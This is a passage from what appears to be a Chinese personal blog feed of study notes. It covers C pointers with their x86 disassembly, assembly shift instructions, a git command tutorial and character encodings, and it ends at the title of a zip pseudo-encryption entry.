class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1:        int* a;</span><br><span class="line">2:        printf(&quot;%d&quot;,*(a+0));</span><br><span class="line">0040D838   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D83B   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D83D   push        ecx</span><br><span class="line">0040D83E   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D843   call        printf (00401060)</span><br><span class="line">0040D848   add         esp,8</span><br><span class="line">3:        printf(&quot;%d&quot;,a[0]);</span><br><span class="line">0040D84B   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D84E   mov         eax,dword ptr [edx]</span><br><span class="line">0040D850   push        eax</span><br><span class="line">0040D851   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D856   call        printf (00401060)</span><br><span class="line">0040D85B   add         esp,8</span><br><span class="line">4:        printf(&quot;%d&quot;,*(a+2));</span><br><span class="line">0040D85E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D861   mov         edx,dword ptr [ecx+8]</span><br><span class="line">0040D864   push        edx</span><br><span class="line">0040D865   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D86A   call        printf (00401060)</span><br><span class="line">0040D86F   add         esp,8</span><br><span class="line">5:       printf(&quot;%d&quot;,a[2]);</span><br><span class="line">0040D872   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D875   mov         ecx,dword ptr [eax+8]</span><br><span class="line">0040D878   push        ecx</span><br><span class="line">0040D879   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D87E   call        printf (00401060)</span><br><span class="line">0040D883   add         esp,8</span><br><span class="line">6:       char** b;</span><br><span class="line">7:       printf(&quot;%d&quot;,*(*(b+0)+0));</span><br><span class="line">0040D886   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D889   mov         eax,dword ptr [edx]</span><br><span class="line">0040D88B   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D88E   push        ecx</span><br><span class="line">0040D88F   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D894   call        printf (00401060)</span><br><span class="line">0040D899   add         esp,8</span><br><span class="line">8:       printf(&quot;%d&quot;,b[0][0]);</span><br><span class="line">0040D89C   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D89F   mov         eax,dword ptr [edx]</span><br><span class="line">0040D8A1   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D8A4   push        ecx</span><br><span class="line">0040D8A5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8AA   call        printf (00401060)</span><br><span class="line">0040D8AF   add         esp,8</span><br><span class="line">9:       printf(&quot;%d&quot;,*(*(b+2)+3));</span><br><span class="line">0040D8B2   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8B5   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8B8   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8BC   push        ecx</span><br><span class="line">0040D8BD   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8C2   call        printf (00401060)</span><br><span class="line">0040D8C7   add         esp,8</span><br><span class="line">10:       printf(&quot;%d&quot;,b[2][3]);</span><br><span class="line">0040D8CA   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8CD   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8D0   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8D4   push        ecx</span><br><span class="line">0040D8D5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8DA   call        printf (00401060)</span><br><span class="line">0040D8DF   add         esp,8</span><br></pre></td></tr></table></figure><h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)[<span class="number">2</span>];</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)[<span class="number">2</span>])a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,**p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>*p和p的存储内容相同，但是宽度不相同。</strong></p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>因为函数的宽度是不确定的，所以不能做++–加减整数，相减的操作。但是可以做比较大小的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>,<span class="keyword">int</span>);</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)<span class="built_in">p</span>(<span class="keyword">int</span>,<span class="keyword">int</span>))Fun;</span><br><span class="line">    p = Fun;<span class="comment">//Fun函数名里面就是地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以隐藏代码到数据区</p><br><h1 id="0x10-异常"><a href="#0x10-异常" class="headerlink" title="0x10 异常"></a>0x10 异常</h1><p>0xC0000005访问错误</p><br><h1 id="0x11-位运算"><a href="#0x11-位运算" class="headerlink" title="0x11 位运算"></a>0x11 位运算</h1><h2 id="算数移位（有符号）"><a href="#算数移位（有符号）" class="headerlink" title="算数移位（有符号）"></a>算数移位（有符号）</h2><p>SAL：算术左移</p><p>SAR：算数右移</p><p>格式：<code>SAL/SAR Reg/Mem, CL/Imm</code></p><p>会把移出的数据放到cf里</p><p>SAL左移的时候会补0，SAR右移补符号位。</p><h2 id="逻辑移位（无符号）"><a href="#逻辑移位（无符号）" class="headerlink" title="逻辑移位（无符号）"></a>逻辑移位（无符号）</h2><p>SHL左<strong>（有符号无符号的左移都用这个）</strong></p><p>SHR右</p><p>只补0，移出的位放到CF里</p><h2 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h2><p>ROL左</p><p>ROR右</p><p>把移出的位放到要补的地方，移出的位放到CF里</p><h2 id="带进位的循环移位"><a href="#带进位的循环移位" class="headerlink" title="带进位的循环移位"></a>带进位的循环移位</h2><p>RCL左</p><p>RCR右</p><p>把CF里放的值补上，移出的位放到CF里</p>]]></content>
      
      
      <categories>
          
          <category> 2020年8月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[工具使用] git</title>
      <link href="/2020/02/18/git/"/>
      <url>/2020/02/18/git/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add file</span><br><span class="line">git commit -m <span class="string">&quot;what&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h1 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h1><p>版本库又名仓库，可以理解为一个目录，这个目录里面的所有文件都可以被git管理。每个文件的修改、删除git都能跟踪，以便任何时刻追踪历史或者还原。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir learngit//首先创建一个目录</span><br><span class="line"><span class="built_in">cd</span> learngit</span><br><span class="line">git init//把这个目录变成git可以管理的仓库(初始化一个git仓库)</span><br></pre></td></tr></table></figure><p>然后你会发现当前目录下多了一个.git目录，这个目录是git用来跟踪管理版本库的。这个目录默认是隐藏的，可以使用<code>ls -ah</code>命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch readme.txt//创建一个txt文件</span><br><span class="line">git add readme.txt//把文件添加到仓库(暂存区)，可多次使用，添加多个文件</span><br><span class="line">git commit -m <span class="string">&quot;wrote a readme file&quot;</span>//将暂存区内容提交到本地仓库</span><br></pre></td></tr></table></figure><p><code>-m</code>后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样就能从历史记录里方便找到改动记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git status//可以掌握工作区的状态，告诉你有文件被修改过</span><br><span class="line">git diff readme.txt//查看difference(差别)</span><br><span class="line">git diff HEAD -- readme.txt//查看工作区和版本库里面最新版本的区别</span><br></pre></td></tr></table></figure><h1 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span>//显示最近到最远的提交日记</span><br></pre></td></tr></table></figure><p>如果嫌输出信息太多，可以加上<code>--pretty=oneline</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline</span><br></pre></td></tr></table></figure><p>你所看到一大串的数字加字母是commit id(提交id)。在git中，用HEAD表示最新提交，上一个版本是HEAD^，上上一个版本就是HEAD^^，100个版本写成HEAD~100。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^//回退到上一个版本</span><br></pre></td></tr></table></figure><p>想要回到之前的版本，就需要找到之前的commit id，把前面几位输上，git会自动去寻找。不能只写一两位，因为git可能会找到多个版本号。</p><p>如果关掉了电脑，没记住git log的显示出的commit id，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog//用来查看你的命令历史，以便确定要回到未来的哪个版本</span><br></pre></td></tr></table></figure><p>工作区有一个隐藏目录.git，这个不算工作区，而是git的版本库。<br>git的版本库里存放了很多东西，其中最重要的是stage的暂存区，还有git为我们自动创建的第一个分支master，以及指向master的第一个指针叫HEAD。</p><p><img src="https://www.liaoxuefeng.com/files/attachments/919020037470528/0" alt="git-repo"></p><h1 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- readme.txt//把readme文件在工作区的修改全部撤销。</span><br></pre></td></tr></table></figure><p>两种情况：</p><ul><li>一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态。</li><li>一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD readme.txt//把暂存区的内容放回工作区</span><br></pre></td></tr></table></figure><p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。HEAD表示最新版本。</p><h1 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br><span class="line">git commit -m <span class="string">&quot;add test.txt&quot;</span></span><br><span class="line">rm test.txt//手动删除文件</span><br><span class="line">git rm test.txt//从版本库中删除文件，和git add一样</span><br><span class="line">git commit -m <span class="string">&quot;remove test.txt&quot;</span></span><br><span class="line">git checkout -- test.txt//从版本库里还原</span><br></pre></td></tr></table></figure><p><code>git checkout</code>其实就是用版本库里的版本替换工作区的版本。</p><h1 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h1><p>你的git仓库和github仓库之间的传输是通过SSH加密的</p><p>第一步：创建SSH Key。在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开shell，创建SSH Key。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail@example.com&quot;</span>//创建SSH Key</span><br></pre></td></tr></table></figure><p><code>id_rsa</code>是私钥，不能泄露出去。<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p><p>第二步：登录github，打开”Settings”，”SSH and GPG keys”页面：然后点击”New SSH Key”，填上任意”Title”，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容。</p><h2 id="创建远程库"><a href="#创建远程库" class="headerlink" title="创建远程库"></a>创建远程库</h2><p>登录github，然后在右上角找到”Create a new repository”，创建一个新仓库。</p><p>在”Repository name”填入库名，其他保持默认设置，点击”Create repository”按钮，成功创建一个新的git仓库</p><p>然后我们根据github的提示，在本地learngit仓库下运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:账户名/仓库名.git</span><br></pre></td></tr></table></figure><p>远程库的名字就是<code>origin</code>，这是git默认的叫法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master//把本地内容上传到远程库</span><br></pre></td></tr></table></figure><p>把本地库内容推送到远程，用<code>git push</code>命令。</p><p>由于远程库是空的，我们第一次推送master分支的时候，加上了<code>-u</code>参数，git不但会把本地的master分支内容推送到远程新的master分支，而且会把本地的master和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>从现在起，只要本地作了提交，就可以通过命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>把本地master分支的最新修改推送至github。</p><h2 id="SSH警告"><a href="#SSH警告" class="headerlink" title="SSH警告"></a>SSH警告</h2><p>当第一次使用git的clone或者push命令连接github时，会得到一个警告：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;github.com (xx.xx.xx.xx)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is xx.xx.xx.xx.xx.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure></blockquote><p>这是因为git使用SSH连接，而SSH连接在第一次验证github服务器的Key时，需要确认github的Key的指纹信息是否真的来自github的服务器，输入yes回车即可。</p><p>Git会输出一个警告，告诉你已经把GitHub的Key添加到本机的一个信任列表里了：</p><blockquote><p>Warning: Permanently added ‘github.com’ (RSA) to the list of known hosts.</p></blockquote><p>这个警告只会出现一次，后面的操作就不会有任何警告了。</p><h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span>//克隆</span><br></pre></td></tr></table></figure><h1 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h1><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p><h2 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git branch dev//创建dev分支</span><br><span class="line">git switch dev//切换到dev分支</span><br><span class="line">git switch -c dev//创建并切换到dev分支</span><br><span class="line">git branch//查看当前分支</span><br></pre></td></tr></table></figure><p>在dev分支上的操作不会影响到master</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge dev//把dev分支的工作成果合并到当前分支上</span><br></pre></td></tr></table></figure><p>合并完成后，就可以放心地删除dev分支了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch -d dev//删除dev分支</span><br><span class="line">git branch -D dev//强行删除dev分支。如果git没有合并，会删除失败</span><br></pre></td></tr></table></figure><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p><p>直接cat冲突文件，Git会用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --graph//查看分支合并图</span><br></pre></td></tr></table></figure><h2 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h2><p>通常，合并分支时，如果没有分歧解决，就会直接移动文件指针，这就是<code>Fast forward</code>模式。</p><p>但这种模式下，删除分支后，会丢掉分支信息。</p><p>如果要<strong>强制禁用Fast forward模式</strong>，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> dev//禁用fast forward合并dev分支</span><br></pre></td></tr></table></figure><p><code> --no-ff</code>参数表示禁用<code>Fast forward</code>，因为本次合并要创建一个新的commit，所以加上<code>-m</code>参数，把commit描述写进去。</p><h2 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h2><p><code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不在上面干活</p><p>干活在<code>dev</code>分支上，到版本发布的时候，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本。</p><p>你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。</p><h2 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h2><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p><p>当手头工作没有完成时，先把工作现场<code>git stash</code>一下</p><p>然后去修复bug，需要在哪个分支上修复bug，就从哪个分支创建临时分支；</p><p>修复后，再<code>git stash pop</code>，回到工作现场；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git stash apply//恢复后，stash内容不删除</span><br><span class="line">git stash drop//删除stash内容</span><br><span class="line">git stash pop//恢复的同时把stash内容也删除了</span><br><span class="line">git stash list//查看stash了哪些存储</span><br></pre></td></tr></table></figure><p> 你可以多次stash，恢复的时候，先用<strong>git stash list</strong>查看，然后恢复指定的stash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure><p>在master分支上修复的bug，想要合并到当前dev分支，可以用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git switch dev//切换到dev目录</span><br><span class="line">git cherry-pick &lt;commit&gt;//合并</span><br></pre></td></tr></table></figure><p>把bug提交的修改“复制”到当前分支，避免重复劳动。</p><h1 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git remote//查看远程库的信息</span><br><span class="line">git remote -v//显示更详细的信息</span><br><span class="line">git checkout -b branch-name origin/branch-name//在本地创建和远程分支对应的分支</span><br><span class="line">git branch --set-upstream branch-name origin/branch-name//建立本地分支和远程分支的关联</span><br><span class="line">git pull//如果使用git push推送失败，因为远程分支比本地的新，使用git pull试图合并</span><br></pre></td></tr></table></figure><p>如果合并有冲突，则解决冲突，并在本地提交</p><p>没有冲突之后，再重新推送</p><h1 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git switch master//切换到需要打标签的分支上</span><br><span class="line">git tag name//打一个新标签名字为name</span><br><span class="line">git tag//查看所有标签</span><br></pre></td></tr></table></figure><p>默认标签是打在最新提交的commit上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？</p><p>方法是找到历史提交的commit id，然后打上就可以了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline --abbrev-commit//查看commit id</span><br><span class="line">git tag name commit_id//打标签</span><br></pre></td></tr></table></figure><p>标签不是按时间顺序列出的，而是按字母排序的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show tagname//查看标签信息</span><br></pre></td></tr></table></figure><p>还可以建立带有说明的标签，<code>-a</code>指定标签名，<code>-m</code>指定说明文字。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -a name -m <span class="string">&quot;xxx&quot;</span> commit_id</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git tag -d name//删除标签</span><br><span class="line">git push origin name//推送某个标签到远程</span><br><span class="line">git push origin --tags//推送全部标签到远程</span><br></pre></td></tr></table></figure><p>如果已经推送到远程，删除标签要麻烦一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git tag -d name//删除本地</span><br><span class="line">git push origin :refs/tags/name//删除远程</span><br></pre></td></tr></table></figure><h1 id="使用github"><a href="#使用github" class="headerlink" title="使用github"></a>使用github</h1><p>参加开源项目，需要先点击fork，在自己账号下克隆一个仓库，然后从自己的账号下clone。</p><p>一定要从自己的账号下clone仓库，这样才能推送修改。</p><p>如果想让官方库接受你的修改，你可以在github上发起一个pull request。</p><blockquote><p>学习链接:<a href="https://www.liaoxuefeng.com/wiki/896043488029600">https://www.liaoxuefeng.com/wiki/896043488029600</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 2020年2月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] 编码</title>
      <link href="/2020/01/31/%E7%BC%96%E7%A0%81/"/>
      <url>/2020/01/31/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>Unicode是国际标准化组织(iso)制定的可以容纳世界上所有文字和符号的字符编码方案。</p><p>Unicode是一个字符集，包含世界各个国家的各个文字的二级制代码</p><p>Unicode最初使用两个字节的十六进制数字表示字符编号，后来随着字符集的扩大，字符编号也需要三个字节或以上的十六进制数字表示。</p><p>UTF-8和UTF-16和UTF-32，是Unicode字符集的实现方式(编码规则)</p><p>UTF意思是unicode转换格式（Unicode transform format）</p><p><strong>ASCII码</strong>：一个英文字母（不分大小写）占一个字节的空间。一个二进制数字序列，在计算机中作为一个数字单元，一般为8位二进制数。换算为十进制，最小值-128，最大值127。如一个ASCII码就是一个字节。</p><blockquote><p>八位的字节一共可以组合出256(2的8次方)种不同的状态。<br>他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作：</p><p>遇上0×10, 终端就换行；</p><p>遇上0×07, 终端就向人们嘟嘟叫；</p><p>遇上0x1b, 打印机就打印反白的字，或者终端就用彩色显示字母。</p><p>他们看到这样很好，于是就把这些0×20以下的字节状态称为”控制码”。他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做<strong>ANSI</strong>(ANSI编码是一种对ASCII码的拓展)的”Ascii”编码（American Standard Code for Information Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的<strong>ASCII</strong>方案来保存英文文字。</p></blockquote><p><strong>UTF-16编码</strong>：UTF-16通常用两个字节表示一个字符，原有的英文编码从单字节变成了双字节，原来的英文编码把高位字节的全部填成了0。</p><p>UTF-16的弊端：浪费存储空间，A一个字节就可以存储，utf16的话需要字节对齐，也就是2个字节，因此utf-8出现</p><p><strong>UTF-8编码</strong>：它是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度，当字符在ASCII码的范围时，就用一个字节表示，保留了ASCII字符一个字节的编码做为它的一部分，注意的是UTF-8的汉字一般为三字节</p><blockquote><ol><li><p> 单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</p></li><li><p> n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。</p></li></ol><p>   解读 UTF-8 编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。</p></blockquote><p><strong>UTF-32编码</strong>：以4个字节表示一个字符</p><blockquote><p>8、16、32可看做每种字符编码存储所需的最少的比特位数</p></blockquote><p><strong>GB2312编码</strong>：中国国家标准简体中文字符集，是对ASCII编码的扩展，收录6763个汉字和682个特殊符号，双字节表示中文字符，其余和ASCII兼容，一个字节表示。解码的时候，当遇到1开头的字节，就把两个字节合起来解释为一个字符。</p><p><strong>GBK编码</strong>：GBK 共收入 21886 个汉字和图形符号，GBK 向下与 GB2312 完全兼容，向上支持 ISO 10646 国际标准。</p><p><strong>GB18030编码</strong>：GB 18030 与 GB 2312-1980 和 GBK 兼容，共收录汉字70244个。与 UTF-8 相同，采用多字节编码，每个字可以由 1 个、2 个或 4 个字节组成</p>]]></content>
      
      
      <categories>
          
          <category> 2020年1月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] zip伪加密</title>
      <link href="/2019/11/08/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2019/11/08/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
